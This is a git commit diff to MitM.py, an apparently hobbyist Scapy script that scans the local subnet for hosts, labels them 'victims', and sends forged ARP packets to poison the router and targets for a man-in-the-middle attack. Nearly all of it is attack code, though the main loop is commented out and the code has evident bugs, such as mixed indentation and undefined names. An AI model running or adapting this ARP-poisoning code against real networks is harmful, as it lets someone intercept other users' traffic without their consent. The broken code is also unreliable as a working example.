106232c6602bd8d032b63af75bac8815c2599324
Milo Grillo <34212857+MiloGrillo@users.noreply.github.com>
2019-03-31 15:39:08 +0200

    Update MitM.py

--- MitM.py
+++ MitM.py
@@ -1,17 +1,22 @@
 from scapy.all import *
 import time
 
+class Victim():
+	def __init__(self, IPaddress):
+		self.IP = IPaddress
+		self.MAC = ""
+
 # IP forwarding must be enabled.
 class PrePreAttack(object):	
 	def get_IP_Addrs(self, routerIP):
-        num_Array = routerIP.split('.')
-        arp_List = ".".join(num_Array[0:3])+".*" #this is to get the string in form "X.X.X.*"
+        	num_Array = routerIP.split('.')
+        	arp_List = ".".join(num_Array[0:3])+".*" #this is to get the string in form "X.X.X.*"
 		ans, unans = arping(arp_List)
-        n = len(ans)
-		IP_Addrs = []
+        	n = len(ans)
+		victims = []
 		for i in range(0, n):
-			IP_Addrs.append(ans[i][1].psrc)
-		return IP_Addrs
+			victims.append(Victim(ans[i][1].psrc))
+		return victims
 
 #class PreAttack(object):
 #	def __init__(self, target, interface):
@@ -25,14 +30,14 @@ class Attack(object):
 		self.router = router
 		self.targets = targets 
 		self.interface = interface
-	def send_Poison(self, MACs):
+	def send_Poison(self):
 		for i in range(0, len(targets)):
 			#arp to spoof the victim, send to router
 			arp1 = Ether() / ARP()
 #			arp1[Ether].src = #attacking MAC address
 #			arp1[ARP].hwsrc = #attacking MAC address
-			arp1[ARP].psrc = self.targets[i] #IP to Spoof
-			arp1[ARP].hwdst = MACs[0]
+			arp1[ARP].psrc = self.targets[i].IP #IP to Spoof
+			arp1[ARP].hwdst = self.targets[0].MAC
 			arp1[ARP].pdst = self.router
 			sendp(arp1, iface = self.interface)
 			#arp to spoof the router, send to victim
@@ -40,8 +45,8 @@ class Attack(object):
 #			arp2[Ether].src = #attacking MAC address
 #			arp2[ARP].hwsrc = #attacking MAC address
 			arp2[ARP].psrc = self.router #IP to Spoof
-			arp2[ARP].hwdst = MACs[i]
-			arp2[ARP].pdst = self.targets[i]
+			arp2[ARP].hwdst = self.targets[i].MAC
+			arp2[ARP].pdst = self.targets[i].IP
 			sendp(arp2, iface = self.interface)
 
 
@@ -52,18 +57,17 @@ if __name__ == '__main__':
 #	my_macs = get_if_hwaddr(interface)
 	IP_router = sr1(IP(dst = "www.wikipedia.org", ttl = 0)/ICMP()) #ttl = 0 to find the router with whom we connected
 	print(IP_router.src)
-	targets_IP = PrePreAttack().get_IP_Addrs(IP_router.src)
-	print(targets_IP[0])
-	targets_MAC = []
+	targets = PrePreAttack().get_IP_Addrs(IP_router.src)
+	print(targets[0])
 #	try:
-#		for i in range(0, len(targets_IP)):
-#			targets_MAC.append(PreAttack(targets_P[i], interface).get_MAC_Addr())
+#		for i in range(0, len(targets)):
+#			targets[i].MAC=PreAttack(targets_P[i], interface).get_MAC_Addr()
 #	except Exception:
 #		print '[Cannot find MAC addresses]'
 #	
 #	while True:
 #		try:
-#			Attacks(targets_IP, interface).send_Poison(targets_MAC)
+#			Attacks(IP_router.src, targets, interface).send_Poison()
 #			sleep(3)
 #		except Exception:
 #			print '[Failed to send arp Poison]'
